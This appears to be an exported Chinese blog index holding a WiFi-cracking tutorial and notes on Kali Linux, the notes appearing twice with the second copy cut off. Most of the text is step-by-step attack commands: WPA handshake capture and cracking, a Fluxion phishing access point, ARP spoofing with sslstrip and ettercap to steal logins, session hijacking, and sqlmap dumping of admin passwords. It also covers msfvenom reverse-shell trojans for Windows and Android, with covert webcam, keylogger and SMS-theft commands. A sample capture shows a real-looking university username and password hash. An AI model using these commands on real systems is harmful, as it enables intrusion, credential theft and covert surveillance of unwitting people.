标签、分类和搜索在编辑区任意行首位置输入以下格式的文字可以标签当前文档： 标签： 未分类 标签以后的文稿在【文件列表】（Ctrl+Alt+F）里会按照标签分类，用户可以同时使用键盘或者鼠标浏览查看，或者在【文件列表】的搜索文本框内搜索标题关键字过滤文稿，如下图所示： 10. 文稿发布和分享在您使用 Cmd Markdown 记录，创作，整理，阅读文稿的同时，我们不仅希望它是一个有力的工具，更希望您的思想和知识通过这个平台，连同优质的阅读体验，将他们分享给有相同志趣的人，进而鼓励更多的人来到这里记录分享他们的思想和知识，尝试点击 (Ctrl+Alt+P) 发布这份文档给好友吧！ 再一次感谢您花费时间阅读这份欢迎稿，点击 (Ctrl+Alt+N) 开始撰写新的文稿吧！祝您在这里记录、阅读、分享愉快！ 作者 @ghosert2016 年 07月 07日 LaTeX. 支持 LaTeX 编辑显示支持，例如：$\\sum_{i=1}^n a_i=0$， 访问 MathJax 参考更多使用方法。 &#8617; code. 代码高亮功能支持包括 Java, Python, JavaScript 在内的，四十一种主流编程语言。 &#8617;","path":"2018/10/30/欢迎使用 Cmd Markdown 编辑阅读器/"},{"title":"WIFI破解","text":"免责申明正如《Metasploit渗透测试指南》一书所述： 不要进行恶意的攻击 不要做傻事 在没有获得书面授权时，不要攻击任何目标 考虑你的行为将会带来的后果 如果你干了些非法的事情，天网恢恢疏而不漏，你总会被抓到牢里的 任何具有一定侵略性的网络攻击行为都属于非法操作。本文中所有的内容是在自家寝室进行，所攻击的wifi也是自家寝室内的，该文仅供学习，切勿用于非法操作，一切后果由使用者本人负责。 前言目前，无论是在家，还是在校，亦或是各种商场，无线wifi都是星罗棋布。但你是否注意到，像CMCC、ChinaNet，亦或是其他一些表面上看上去比较信得过的wifi名（BSSID）很是常见，尤其是在人流量高、人口密度大的区域。此时的你或许会感到疑惑，但是当你看见Free字样再加上你目前对wifi的需求，一时昏了头的你可能就管不了那么多了（管他三七二十一，连上再说，Free的wifi不要白不要，我傻啊！！！）。令你始料未及的是一旦当你client那些钓鱼wifi之后，你的手机内的一切的一切的信息都在对方的掌控之中，比如说照片、通讯录、各种应用密码等，我们换句话说，你的手机在这一瞬间就相当于有了第二个主人。 综上，在这鱼龙混杂的万千世界中了解一些网络安全的知识对于每个人来说都是有必要的。本文主要介绍无线渗透中的关于wifi破解一些常用方法以此加强您的自我防护意识。 环境准备环境介绍 系统：Kali Linux可在其官网了解相关信息及下载iso镜像文件。 USB无线网卡笔电内置的无线网卡不可用于Kali Linux的无线学习，我们需要购买一个外置的USB无线网卡，可根据自己的需要在某宝进行购买。本文使用的是RT3070，购买链接是：https://item.taobao.com/item.htm?spm=a230r.1.14.67.72537d6elT6GLa&amp;id=576808272403&amp;ns=1&amp;abbucket=13#detail Kali安装及基本配置Kali安装目前主要使用的渗透工具主要有两种，一个是Backtrack，另一个是Kali，两者在使用上来讲并无差别，在本文中使用的是Kali Linux系统。 Kali官网及下载地址：https://www.kali.org/ 在官网下载好Kali Linux iso镜像文件之后，我们需要将其进行安装，一般有U盘安装、虚拟机安装、双系统等方式。本文只介绍VMware虚拟机中安装Kali的方式，有其他需要的朋友可自行查找相关资料。 Kali的安装总的来说和Ubuntu的安装并无一二，安装kali可暂且移步：Xshell远程连接linux并远程访问Jupyter notebook服务（深度学习环境的搭建），如下所示部分： 在这里值得一说的是，在Kali安装的最后一步中，会有两个选择，一个是手动输入设备，另一个是/dev/sda，在这里我们务必选择/dev/sda，选择之后待其自动重启即可使用。 Kali的基本配置 该部分内容以后有时间单独成文记录。 Fluxion安装Fluxion的官方部分说明如下： Fluxion is a security auditing and social-engineering research tool. It is a remake of linset by vk496 with (hopefully) fewer bugs and more functionality. The script attempts to retrieve the WPA/WPA2 key from a target access point by means of a social engineering (phishing) attack. It’s compatible with the latest release of Kali (rolling). Fluxion’s attacks’ setup is mostly manual, but experimental auto-mode handles some of the attacks’ setup parameters. Read the FAQ before requesting issues. 总的来说，Fluxion不同于一般的暴力wifi破解，它是通过社会工程学来获取WPA2秘钥。 Github地址：https://github.com/wi-fi-analyzer/fluxion.git官网地址：https://fluxionnetwork.github.io/fluxion/ 在安装Kali Linux之后，虽然其就像Anaconda一样集成了大量的工具，但是默认是没有对Fluxion进行安装的，所以需要我们自行安装，此处安装使用git即可，命令如下：1git clone https://github.com/wi-fi-analyzer/fluxion.git 不到一杯茶的功夫即可完成该下载过程。 WIFI破解万能钥匙获取wifi秘钥在wifi破解中，相信大家接触最多的就是万能钥匙了，但是只限连接部分的查询结果wifi，而且连接成功后绝大部分人并不知道连接的wifi密码，所以先从万能钥匙说起，由于万能钥匙不是本文的重点，所以在这只蜻蜓点水般介绍即可。 在连接万能钥匙之后，我们可以通过以下三种方式来获取秘钥。 RE获取进入RE管理器（手机默认文件管理器），打开/data/misc/wpa_supplicant.conf文件可见psk字段，即wifi明文秘钥。（操作前提需要ROOT） 微信获取打开手机并进入无线wlan界面，点击你使用万能钥匙连接的wifi可见一个二维码，保存该二维码之后可使用微信进行扫描，扫描结果可见此wifi明文秘钥。 电脑获取在终端使用如下命令可见秘钥1netsh wlan show profile name=[wifi名] key=\"clear\" Kali暴力破解airmon-ng监听插上USB无线网卡之后，我们将需要该网卡连接至Kali Linux系统中才能正常侦测到周围wifi，可根据虚拟机 -&gt; 可移动设备 -&gt; USB连接进行操作，如下图所示（这张图不太好截，手机拍的，根据图片操作即可）： 之后，我们需要确认是否已经网卡的引入，可通过如下命令进行操作：1ifconfig -a 输出结果如下： 若命令输出wlan0网卡，则说明已经映射成功，之后我们即可启动该网卡来进一步的进行侦测周围wifi，启动如下可根据如下命令进行（三部曲）：123456# 关闭network-manager服务，已避免对网卡造成不必要的影响service network-manager stop # 我们在使用暴力破解wifi时，会使用到airmon-ng，该命令可将对airmon-ng产生影响的进程kill掉airmon-ng check kill # 启动wlan0网卡，处于监听（monitor）状态airmon-ng start wlan0 补充： 查看影响airmon-ng使用的进程：airmon-ng check关闭监听（monitor）状态：airmon-ng stop wlan0mon重启network-manager服务：service network-manager restart当无线网卡无法继续监听时，可尝试一下操作（重启）： ifconfig wlan0mon down ifconfig wlan0mon up airodump-ng 探测在使用USB无线网卡监听之后，我们就能对周围的wifi进行探测了，该过程可以探测到包含了wifi的详细信息：BSSID、ESSID、信道等，对周围所有的wifi进行探测的命令如下：1airodump-ng wlan0mon 命令执行结果如下图所示： 结果分析： BSSID：Service Set Identifier，站点的MAC地址，用于区分不同的网络，可理解为路由器的身份证PWR：可理解为信号强度的体现，绝对值越小信号越强Beacons：连接该wifi（AP）所发出的通告编号，每个接入点（AP）在最低速率（1M）时差不多每秒会发送10个左右的beacon，所以它们能在很远的地方就被发现。#Data：数据传输量#/s：过去10秒钟内每秒捕获数据分组的数量。CH：信道MB：AP的最大传输速率ENC：加密方式CIPHER：检测到的加密算法。这个不是特别懂。AUTH：认证协议ESSID：侦测到的wifi名 更多详尽的专业解释可见：https://wenku.baidu.com/view/1907172e7375a417866f8f30.html 当你执行如上命令之后，的确可以侦测到附近所有的wifi接入点，但是我们确定了破解的wifi目标之后，我们需要对结果进行一些特定的限制（筛选）以便更为方便的分析，指定探测命令如下：1airodump-ng wlan0mon --bssid [目标MAC地址] -c [频道] -w [抓包结果的文件名] 其中STATION表示目前连接该wifi下的设备的MAC地址 aireplay-ng抓包对指定wifi进行探测之后，有时我们并不会主动对该wifi进行抓包操作，原因是在我们使用airodump的时候，原设备就已经连接到我们的目标wifi了，此时要想抓包，我们需要使用到aireplay-ng来对目标设备进行强制断开连接，待其自动连接之后我们也就抓到包了，命令如下：1aireplay-ng -0 2 -a [接入点MAC地址] -c [客户端接入地址] wlan0mon 执行结果如下： 解释：上述的包与爬虫抓包类似，可以简单的理解为含有我们需要重要信息的文件。 aircrack-ng 破解通过上述操作，我们已经成功抓包了，通过以下命令来查看抓包文件:1cd /root &amp;&amp; ls 我们破解时主要用到的是.cap文件，破解命令如下：1aircrack-ng -w [字典文件] [.cap文件] Kali自带的字典文件目录有以下几个（比较小）：123/usr/share/john//usr/share/wfuzz/wordlist//usr/share/wordlists/ 解释：暴力破解，顾名思义就是我们需要准备一个尽量详尽且可能较大的字典文件，该文件中也许包含了小至以M为单位的秘钥文件，大至以G为单位的秘钥文件，然后使用aircrack-ng一个个去暴力破解，待其找到正确秘钥之后就会自动终止程序。通过如上解释，所以说如果我们的字典足够完整，也许在你睡一觉之后即可破解，此时的你需要对收获与时间成本进行考量，，还有一种情况就是几天下来直至字典跑完也没有成功破解wifi，原因就是使用的字典中未含有正确秘钥。 补充：1. 可通过彩虹表的方法来增大跑字典的效率。2. 可以使用GPU来增大跑字典的效率。3. 可使用kali内置的crunch工具自动生成字典。以上补充有兴趣的可以去了解，这里就不详细说明了，有时间的话也许会在后面的文章单独成文。 常用命令：123grep [Password] [字典] # 查看字典中是否含有目标秘钥cat [字典] | wc -l # 查看字典文件有多少行数据cd /usr/share/wordlists &amp;&amp; gunzip rockyou.txt.gz # 解压Kali自带rockyou.txt.gz文件 使用aircrack-ng之后，如果破解成功将显示如下内容： Fluxion社会工程学破解以上是Kali暴力破解的内容，但往往我们使用暴力破解的结果不尽如人意，此时我们可以考虑Fluxion社会工程学来进行破解。社会工程学是很高深的一门学问，为了吊大家的胃口这里就简单的说下：好像是外国一名黑客入侵攻击之后被抓坐牢，然后出了一本书。强烈推荐大家去了解下，很有意思的 (￣_,￣ )，像许多电影亦或是电视剧都有相关内容的出现，比如《Who am i，没有绝对的安全系统》、《黑客军团》，为了让该推荐在该文章中更加的醒目些，以下博主推荐的连接内容务必前去看看，相当有意思的，不感兴趣的话那就算了(ノへ￣、)： https://baike.baidu.com/item/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/2136830?fr=aladdin https://baike.baidu.com/item/%E6%AC%BA%E9%AA%97%E7%9A%84%E8%89%BA%E6%9C%AF/10253577 好了，社会工程学介绍完了，我们来讲讲Flusion的使用吧（前面已经安装过了，忘了的可往回翻一翻）。 12345cd /root/ # 进入root目录（根据自己的Fluxion安装路径）ls # 列出当前所有文件，查看是否含有fluxioncd fluxion # 进入fluxionls # 查看该项目内的文件，具体文件介绍可自行查找资料，这里接不说了./fluxion.sh # 启动fluxion 启动之后，你或许会看见如下内容： 内容显示你当前kali中并没有安装相关插件，我们可通过如下进行安装：1apt-get install XXXXXX # XXXXXX表示的是未安装的插件，比如apt-get install bc，将所有的插件安装一遍即可 安装之后我们再次执行fluxion:1cd /root/fluxion &amp;&amp; ./fluxion.sh 初次接触fluxion的朋友可能不知道怎么操作，但具体操作也没有那什么难度，所以这里就贴图简单的解释一下。 选择语言 从上图我们可以看到有11个选项，每个选项对应一种语言操作，这里我们直接选择6：chinese 选择网卡 此处是网卡的选择，当你插上USB无线网卡并成功连接之后，虚拟机会自动监听，所以直接默认即可 选择信道并开始监听 这里我们选择所有信道，选择之后将会出现类似之前跑字典的信道界面，当看见你想要破解的wifi之后我们需要执行ctrl+c退出即可 选择目标 选择目标wifi代号 创建AP 因为这里我们使用的是社会工程学来进行欺骗，所以我们需要创建一个伪装AP来供目标连接，直接选择1即可 ——————————————————————————————分割线—————————————————————————————— 后面的内容就是真正的拦截过程，由于现在室友正在使用wifi，这里就暂时写到这了，以后有机会再来补充。简单的介绍一下吧： 首先执行生成一个web站点，该站点为钓鱼网站，主要用于目标登录其Wifi。我们执行命令之后，目标路由器或者交换机上所连接的设备将会自动断开，此后将会自动生成一个我们伪装的AP，待目标设备连接上该AP之后将会自动跳转到钓鱼站点，待其输入密码后我们既能在Kali终端下得到目标wifi的密码，得到密码之后程序将会自动终止，目标wifi也将恢复正常。 总结以上就是本文所有wifi的破解方法了，如果日后接触到了其他其他方法再在本文进行更新。最后，在这里再提醒一下： 任何具有一定侵略性的网络攻击行为都属于非法操作。本文中所有的内容是在自家寝室进行，所攻击的wifi也是自家寝室内的，该文只供学习，切勿用于非法操作，一切后果由使用者本人负责。 2018-10-12,By Zero","path":"2018/10/12/WIFI破解/"},{"title":"Kali基本操作","text":"以下内容为博主学习《Kali Linux渗透测试的艺术》一书所记录的笔记，有点凌乱、还未整理，有时间再来弄。 一、换源并安装open-vm-tools1.1 打开sources.list文件1leafpad /etc/apt/sources.list 1.2 在文件中添加如下内容1234deb http://mirrors.edu.cn/kali sana main non-free contribdeb http://mirrors.edu.cn/kali-security/sana/updates main contrib non-freedeb-src http://mirrors.ustc.edu.cn/kali-security/sana/updates main contrib non-freedeb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free 1.3 更新并安装12apt-get updateapt-get install open-vm-tools-desktop fuse 二、安装中文输入2.1 下载搜狗在pinyin.sogou.com/linux中下载搜狗 2.2 安装终端进入上方文件路径，执行如下：12解决依赖：apt-get install -f安装：dpkg -i 包名 三、美化kali图标位置：/usr/share/icons/主题位置：/usr/share/themes/ 四、局域网断网攻击4.1 欺骗欺骗命令如下：1arpspoof -i 网卡 -t 被骗目标ip 网关 欺骗命令执行之前需要桥接自己的kali网络，其桥接过程如下： 右键kali系统，点开设置 将网络适配器设置成桥接模式 一次点开：编辑 -&gt; 虚拟网络编辑器 -&gt; vmnet0 -&gt; 确定 参数解读： 网卡：网卡是kali的网卡名，可以使用ifconfig查看（可见eth0） 被骗目标ip：受害者的ip，windows用户可以使用ipconfig查看 网关：网关是一个中间载体，同样可以使用ipconfig查看（默认网关） ip查询：我们在对受害者进行arp欺骗的时候，往往是不知道对方的ip的，但是我么可以使用如下命令偷偷的查询对方ip：1fping -asg 192.168.31.0/24 //网关最后是0+24 4.2 攻击4.2.1 瘫痪对方的电脑执行上述命令，即可让对方的网络瘫痪： 1arpspoof -i 网卡 -t 被骗目标ip 网关 执行之后，对方就无法正常使用网络了（比如访问网页、qq聊天等等一切网络活动），ctrl+z之后取消瘫痪操作 4.2.2 劫持对方的请求（账号，密码之类的）这里的劫持与上后面的瘫痪有点不同，劫持的话不能让对方网络瘫痪，所以我们在劫持之前需要进行如下命令操作（ip流量转发）：123cd /proc/sys/net/ipv4/ # 进入该目录cat ip_forward # 查看属性值，会发现输出0（默认是0，我们需要更改为1）echo 1 &gt; ip_forward```# 将ip_forward值改为1 如上操作之后我们继续执行arpspoof欺骗：1arpspoof -i 网卡 -t 被骗目标ip 网关 在欺骗之后，我们执行如下命令来进行嗅探：1ettercap -Tq -i eth0 执行之后发现，虽然这次对方可以正常使用网络，但是他的电脑已经在我们的监控中了，比如目标登录自己的某个站点，则在kali的终端上会输出对方的账号及密码 4.2.4 嗅探对方的浏览图片在进行上述的ip流量转发之后，我们可以使用如下命令来截取对方浏览页面的图片：1driftnet -i eth0 执行之后，会出现一个窗口 ，该窗口用于显示对方浏览页面的图片，并会将图片保存至kali本地 五、https账号、密码获取5.1 准备工作5.1.1 Vim：文本编辑器进入文件进行编辑：vim 123.txt （不存在会自动创建）退出文件编辑： 按ESC shift+： 输入q！ # 不保存退出 打开 etterc.conf文件1vim /etc/ettercap/ettc.conf/ 移动光标，把linux设置一下，将redir前的注释符删掉123# if you use iptables: #redir_command_on = \"iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport\" #redir_command_off = \"iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport\" 刚开始是不能编辑的，编辑操作如下 vim编辑：按一下 i 就可以对文件进行编辑了，在上述所述的位置将两个#去掉 vim保存：按一下ESC键，再按shift+:键，继续如下： wq 保存并退出 q! 不保存并退出 5.1.2 开启ssh：1/etc/initd/ssh start 5.1.3 sslstrip工具这个工具能够把https的链接还原为http。执行命令：1sslstrip -a -f -k 参数说明： -a -f -k 5.2 截取账号及密码 执行欺骗操作 1arpspoof -i eth0 -t 192.168.31.117 192.168.31.1 执行sslstrip 1sslstrip -a -f -k 执行ettercap 1ettercap -Tq -i eth0 当目标用户登录https登录的时候就可以在kali终端获取到他的账号以及密码，例子如下： 12345HTTP : 211.80.112.41:80 -&gt; USER: 1620814 PASS: 741948a7645fa6f8da44f69bd12e70443cc9d45b9714a26af17c84abe4e4d75a INFO: mids.gench.edu.cn/_customize/passLoginCONTENT: loginTicket=425d9c18-424b-418d-b027-2095e618f829&amp;username=1620814&amp;password=741948a7645fa6f8da44f69bd12e70443cc9d45b9714a26af17c84abe4e4d75a 分析： HTTP：ip及端口 USER：用户名 PASS：登录密码，注意：这里的密码并不是明文的，他是经过加密的，至于如何解密这个密码，以后有时间再来介绍 CONTENT：参数的组合 六、回话劫持，登录目标站点6.1 工具准备 arpspoof 欺骗 wireshark 抓包 ferret 重新生成抓包后的文件 hamster ferret安装，一次执行如下：123dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install ferret-sidejack:i386apt-get clean &amp;&amp; apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get dist-upgrade -yapt install ferret -y 6.2 过程（方法一） arpspoof欺骗 启动wireshark 1wireshark 点击eth0网卡，并让他持续运行下去 目标登录某个站点（上钩） 为了防止延迟，让wireshark再运行一段时间之后停掉wireshark 保存文件名为cookie至桌面，并格式为wireshark…….pacp 终端进入桌面，并执行如下命令（这个ferret有点问题，在这记录一下，以后再来看）： 1ferret -r cookie.pcap 执行hamster，会看到要求我们把代理改成本地（127.0.0.1）的，然后端口为1234 代开kali内置的火狐浏览器 点击设置 -&gt; Advanced -&gt; Network -&gt; Settings -&gt; 勾选Manual……并将http proxy改为127.0.0.1：1234 在kali中访问127.0.0.1：1234 之后会发现有个欺骗的ip，点开后就会出现很多的链接，ctrl+f找到 6.3 过程（方法二） ferret -i eth0 以后在记录 七、SQLMAP注入，ASP、PHP网站渗透7.1 科普7.1.1 ASPASP即Active Server Pages，是MicroSoft公司开发的服务器端脚本环境，可用来创建动态交互式网页并建立强大的web应用程序。当服务器收到对ASP文件的请求时，它会处理包含在用于构建发送给浏览器的HTML（Hyper Text Markup Language，超文本置标语言）网页文件中的服务器端脚本代码。除服务器端脚本代码外，ASP文件也可以包含文本、HTML（包括相关的客户端脚本）和com组件调用。 [1-2]ASP简单、易于维护 ， 是小型页面应用程序的选择 ，在使用DCOM （Distributed Component Object Model）和 MTS（Microsoft Transaction Server）的情况下， ASP甚至可以实现中等规模的企业应用程序。 [3] 7.1.2 PHPPHP（外文名:PHP: Hypertext Preprocessor，中文名：“超文本预处理器”）是一种通用开源脚本语言。语法吸收了C语言、Java和Perl的特点，利于学习，使用广泛，主要适用于Web开发领域。PHP 独特的语法混合了C、Java、Perl以及PHP自创的语法。它可以比CGI或者Perl更快速地执行动态网页。用PHP做出的动态页面与其他的编程语言相比，PHP是将程序嵌入到HTML（标准通用标记语言下的一个应用）文档中去执行，执行效率比完全生成HTML标记的CGI要高许多；PHP还可以执行编译后代码，编译可以达到加密和优化代码运行，使代码运行更快。 7.2 ASP渗透 监测是否存在注入1sqlmap -u 网站 --dbs 如果该目标网站有注入，则会返回数据库的各种信息。 拆解目标网站的数据库表 1sqlmap -u 网站 --tables 根据User表拆解列名 1sqlamp -u 网站 --columns -T \"user\" username拆解出来后就不需要再进行拆解了 得到目标网站后台管理员的登录密码1sqlmap -u 目标网站 --dump -C \"username,password\" -T \"user\" —dump：下载数据-C “username,password” 列名 7.3 PHP渗透待更新 7.4 Cookie渗透待更新 八、Metasplooit8.1 基本操作 启动：msfconsole 漏洞利用工具：exploit 漏洞执行后的demo：payloads 8.2 远程控制软件8.2.1 实现过程 根据自己的ip设定一个木马（旧版使用msfpayload 不是 msfvenom -p），本操作是在桌面路径下执行 1msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=kali的ip LPORT=55555 -f exe &gt; test.exe 之后会生成一个test.exe木马程序，将文件拖至windows平台上 使用handler模块，本操作以及之后的操作是在msfconsole下执行 1use exploit/multi/handler 用shellcode程序 1set PAYLOAD windows/meterpreter/reverse_tcp 查看 1show options 设置参数，比如设置ip和端口 12set LHOST 自己的ipset LPORT 端口（55555） 执行并等待目标上钩 1exploit 8.2.2 木马基本功能当用户点击您的鱼饵之后，您就拥有了对方的所有权限，一下是一些基本的操作： sysinfo：获取到对方设备的系统信息 shell获取受害者的终端权限，通过这个终端您就可以完全控制对方的设备 background：将该权限放到后台，通过session -l（小写字母I） 1来重新获取会话 run vnc：开启远程桌面，执行之后就可以看到对方完整的桌面了。 注入进程 得到要注入的pid进程：ls migrate XXX（pid）注入 8.2.3 文件管理功能 download 下载文件 edit 编辑文件 cat 查看文件 mkdir 创建文件夹 mv 移动文件 rm 删除文件 upload 上传文件 rmdir 删除文件夹 8.2.4 网络及系统操作网络操作： arp 看arp缓冲表 ifconfig ip地址网卡 getproxy 获取代理 netstat 查看端口链接 系统操作： kill 杀进程 ps 查看进程表 reboot 重启电脑 reg 修改注册表 shell 获取终端 shutdown 关闭电脑 sysinfo 获取系统信息 8.2.5 用户操作和其他功能 enumdesktops 窗体 keyscan_dump 键盘记录—下载 keyscan_start 键盘记录—开始 keyscan_stop 键盘记录—停止 uictl 获取键盘鼠标控制权 record_mic 声音和音频录制 webscan_chat 查看摄像头接口 webscan_list 查看摄像头列表 webscan_stream 查看摄像头获取（偷窥） getsystem 获取管理员权限 hashdump 下载hash 九、安卓渗透9.1 实现过程 9.1 在终端根据自己的ip生成安卓木马1msfvenom -p android/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=kali的ip LPORT=55555 -f apk &gt; test.APK 生成木马之后，我们将木马程序装在手机上即可。在这里呢，也就是我们平时比较常见的未知链接、不明邮件之类的鬼东西。 9.2 启动Metasplooit 1msfconsole 9.3 使用handler 1use exploit/multi/handler 9.4 设置安卓木马 1set PAYLOAD android/meterpreter/reverse_tcp 9.5 查看参数 1show options 9.6 设置参数 12set LHOST 192.168.31.147set HPORT 55555 9.7 启动监听 1exploit 9.2 常见操作 search 搜索文件（.jpg、.png、.bmp之类的文件），这个操作就有点邪恶了，大家一定要注意哦！！！ download 下载（.jpg、.png、.bmp之类的文件，还有你的所有短信、所有电话联系人…………………） webcam_stream 开启手机摄像头 webcam_snap 启动摄像头进行自动拍照（小心，这里拍照的过程中是不会有任何响应的，也就是说在这个过程中手机主人是不可能有任何察觉的） check_root 检查ROOT dump_calllog 下载电话记录 dump_contracts 下载短信记录 geolocat gps定位 十、Fluxion10.1 Fluxion下载下载fluxion源码并进入fluxion且运行：1234git clone https://github.com/FluxionNetwork/fluxion.git cd fluxion./fluxion.sh若提示没下载fluxion.sh，则按照要求下载就行 十一、密码破解 查看kali本机的密码字典 1locate wordlist 查看某个密码文件 1cat /etc/shadow 拷贝/etc/shadow密码文件 1cp /etc/shadow/ /root/Desktop/hash.list more /etc/login.defs 十二、Hydra1 十三、无线破解首先做的三步：123service network-manager stopairmon-ng check killaiarmon-ng start wlan0 开启监听：1airmon-ng statr wlan0 监听所有：1airodump-ng wlan0mon 监听指定bssid：1airodump-ng wlan0mon --bssid XXXX -c 频道 -w wpa(保存名) 将连接打掉：1aireplay-ng -0 2 -a [mac地址] -c [客户端mac地址] wlan0mon 12ifconfig wlan0mon downifconfig wlan0mon up 破解：1aircrack-ng -w [字典] /root/XXX.cap kali自带常用字典目录：12/usr/share/john/password.lst/usr/share/wfuzz/wordlist/ 查看字典文件是否含有该密码：1grep Password password.lst 查看字典有多少行：1cat [字典] | wc -l 解压文件：1gunzip rockyou.txt.gz 发现支持wps的AP123wash -i wlan0mon或者是airodump-ng wlan0mon --wps 爆破pin码：1reaver -i wlan0mon -b [ap mac] -vv -c [信道] wifite 伪造wifi：1airbase-ng -a [ap_mac] -c [信道] --essid [wifi名字] wlan0mon ```echo [ap(wifi名)] &gt;essid.txtairolib-ng essid_db —import essid essid.txtairolib-ng essid_db —statsairolib-ng essid_db —import password ./names.txtairolib-ng essid_db —batchaircrack-ng -r essid_fb /root/wpa-01.cap","path":"2018/09/28/Kali/"},{"title":"Kali基本操作","text":"以下内容为博主学习《Kali Linux渗透测试的艺术》一书所记录的笔记，有点凌乱、还未整理，有时间再来弄。 一、换源并安装open-vm-tools1.1 打开sources.list文件1leafpad /etc/apt/sources.list 1.2 在文件中添加如下内容1234deb http://mirrors.edu.cn/kali sana main non-free contribdeb http://mirrors.edu.cn/kali-security/sana/updates main contrib non-freedeb-src http://mirrors.ustc.edu.cn/kali-security/sana/updates main contrib non-freedeb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free 1.3 更新并安装12apt-get updateapt-get install open-vm-tools-desktop fuse 二、安装中文输入2.1 下载搜狗在pinyin.sogou.com/linux中下载搜狗 2.2 安装终端进入上方文件路径，执行如下：12解决依赖：apt-get install -f安装：dpkg -i 包名 三、美化kali图标位置：/usr/share/icons/主题位置：/usr/share/themes/ 四、局域网断网攻击4.1 欺骗欺骗命令如下：1arpspoof -i 网卡 -t 被骗目标ip 网关 欺骗命令执行之前需要桥接自己的kali网络，其桥接过程如下： 右键kali系统，点开设置 将网络适配器设置成桥接模式 一次点开：编辑 -&gt; 虚拟网络编辑器 -&gt; vmnet0 -&gt; 确定 参数解读： 网卡：网卡是kali的网卡名，可以使用ifconfig查看（可见eth0） 被骗目标ip：受害者的ip，windows用户可以使用ipconfig查看 网关：网关是一个中间载体，同样可以使用ipconfig查看（默认网关） ip查询：我们在对受害者进行arp欺骗的时候，往往是不知道对方的ip的，但是我么可以使用如下命令偷偷的查询对方ip：1fping -asg 192.168.31.0/24 //网关最后是0+24 4.2 攻击4.2.1 瘫痪对方的电脑执行上述命令，即可让对方的网络瘫痪： 1arpspoof -i 网卡 -t 被骗目标ip 网关 执行之后，对方就无法正常使用网络了（比如访问网页、qq聊天等等一切网络活动），ctrl+z之后取消瘫痪操作 4.2.2 劫持对方的请求（账号，密码之类的）这里的劫持与上后面的瘫痪有点不同，劫持的话不能让对方网络瘫痪，所以我们在劫持之前需要进行如下命令操作（ip流量转发）：123cd /proc/sys/net/ipv4/ # 进入该目录cat ip_forward # 查看属性值，会发现输出0（默认是0，我们需要更改为1）echo 1 &gt; ip_forward```# 将ip_forward值改为1 如上操作之后我们继续执行arpspoof欺骗：1arpspoof -i 网卡 -t 被骗目标ip 网关 在欺骗之后，我们执行如下命令来进行嗅探：1ettercap -Tq -i eth0 执行之后发现，虽然这次对方可以正常使用网络，但是他的电脑已经在我们的监控中了，比如目标登录自己的某个站点，则在kali的终端上会输出对方的账号及密码 4.2.4 嗅探对方的浏览图片在进行上述的ip流量转发之后，我们可以使用如下命令来截取对方浏览页面的图片：1driftnet -i eth0 执行之后，会出现一个窗口 ，该窗口用于显示对方浏览页面的图片，并会将图片保存至kali本地 五、https账号、密码获取5.1 准备工作5.1.1 Vim：文本编辑器进入文件进行编辑：vim 123.txt （不存在会自动创建）退出文件编辑： 按ESC shift+： 输入q！ # 不保存退出 打开 etterc.conf文件1vim /etc/ettercap/ettc.conf/ 移动光标，把linux设置一下，将redir前的注释符删掉123# if you use iptables: #redir_command_on = \"iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport\" #redir_command_off = \"iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport\" 刚开始是不能编辑的，编辑操作如下 vim编辑：按一下 i 就可以对文件进行编辑了，在上述所述的位置将两个#去掉 vim保存：按一下ESC键，再按shift+:键，继续如下： wq 保存并退出 q! 不保存并退出 5.1.2 开启ssh：1/etc/initd/ssh start 5.1.3 sslstrip工具这个工具能够把https的链接还原为http。执行命令：1sslstrip -a -f -k 参数说明： -a -f -k 5.2 截取账号及密码 执行欺骗操作 1arpspoof -i eth0 -t 192.168.31.117 192.168.31.1 执行sslstrip 1sslstrip -a -f -k 执行ettercap 1ettercap -Tq -i eth0 当目标用户登录https登录的时候就可以在kali终端获取到他的账号以及密码，例子如下： 12345HTTP : 211.80.112.41:80 -&gt; USER: 1620814 PASS: 741948a7645fa6f8da44f69bd12e70443cc9d45b9714a26af17c84abe4e4d75a INFO: mids.gench.edu.cn/_customize/passLoginCONTENT: loginTicket=425d9c18-424b-418d-b027-2095e618f829&amp;username=1620814&amp;password=741948a7645fa6f8da44f69bd12e70443cc9d45b9714a26af17c84abe4e4d75a 分析： HTTP：ip及端口 USER：用户名 PASS：登录密码，注意：这里的密码并不是明文的，他是经过加密的，至于如何解密这个密码，以后有时间再来介绍 CONTENT：参数的组合 六、回话劫持，登录目标站点6.1 工具准备 arpspoof 欺骗 wireshark 抓包 ferret 重新生成抓包后的文件 hamster ferret安装，一次执行如下：123dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install ferret-sidejack:i386apt-get clean &amp;&amp; apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get dist-upgrade -yapt install ferret -y 6.2 过程（方法一） arpspoof欺骗 启动wireshark 1wireshark 点击eth0网卡，并让他持续运行下去 目标登录某个站点（上钩） 为了防止延迟，让wireshark再运行一段时间之后停掉wireshark 保存文件名为cookie至桌面，并格式为wireshark…….pacp 终端进入桌面，并执行如下命令（这个ferret有点问题，在这记录一下，以后再来看）： 1ferret -r cookie.pcap 执行hamster，会看到要求我们把代理改成本地（127.0.0.1）的，然后端口为1234 代开kali内置的火狐浏览器 点击设置 -&gt; Advanced -&gt; Network -&gt; Settings -&gt; 勾选Manual……并将http proxy改为127.0.0.1：1234 在kali中访问127.0.0.1：1234 之后会发现有个欺骗的ip，点开后就会出现很多的链接，ctrl+f找到 6.3 过程（方法二） ferret -i eth0 以后在记录 七、SQLMAP注入，ASP、PHP网站渗透7.1 科普7.1.1 ASPASP即Active Server Pages，是MicroSoft公司开发的服务器端脚本环境，可用来创建动态交互式网页并建立强大的web应用程序。当服务器收到对ASP文件的请求时，它会处理包含在用于构建发送给浏览器的HTML（Hyper Text Markup 